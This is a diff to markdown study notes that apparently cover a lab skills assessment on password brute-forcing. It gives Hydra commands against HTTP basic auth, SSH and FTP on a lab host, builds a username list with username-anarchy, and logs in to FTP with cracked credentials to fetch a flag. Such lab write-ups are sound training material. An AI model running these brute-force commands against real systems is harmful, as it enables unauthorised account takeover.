@@ -904,18 +904,59 @@ This approach underscores the importance of strong, unique authentication practi
 
 ---
 
-#Skills Assessment Part 1
-  ##What is the password for the basic auth login?
-    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.253.216 http-get / -s 55023
+# Skills Assessment
 
-#Skills Assessment Part 2
-  ##What is the username of the ftp user you find via brute-forcing?
+## Part 1: Basic Auth Login
+**Objective:** Find the password for the basic authentication login.
+
+### Steps:
+1. Use Hydra to perform a brute-force attack on the HTTP service running on port `55023`.
+    ```bash
+    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.253.216 http-get / -s 55023
+    ```
+
+### Outcome:
+The password for the basic auth login is discovered.
+
+---
+
+## Part 2: FTP User and Flag Extraction
+**Objective:** Identify the username for the FTP service and retrieve the flag.
+
+### Steps:
+1. Perform a brute-force attack on the SSH service to confirm access:
+    ```bash
     hydra -s 44625 -l satwossh -P 2023-200_most_used_passwords.txt ssh://83.136.253.216 -t 5
-    ssh satwossh@ip -p port ./username-anarchy Thomas Smith > thomas_smith_usernames.txt
+    ```
+
+2. Use the discovered SSH credentials to log in and extract potential usernames:
+    ```bash
+    ssh satwossh@83.136.253.216 -p 44625 ./username-anarchy Thomas Smith > thomas_smith_usernames.txt
+    ```
+
+3. Perform a brute-force attack on the FTP service using the extracted usernames:
+    ```bash
     hydra -L thomas_smith_usernames.txt -P ../passwords.txt ftp://127.0.0.1
+    ```
+
+4. Log in to the FTP service using the valid credentials:
+    ```bash
     ftp 'ftp://thomas:chocolate!@localhost'
+    ```
+
+5. Navigate and retrieve the flag:
+    ```bash
     ls
     get flag.txt
     exit
+    ```
+
+6. Read the contents of the flag:
+    ```bash
     cat flag.txt
+    ```
+
+### Outcome:
+The flag is successfully retrieved and its contents are revealed.
+
     
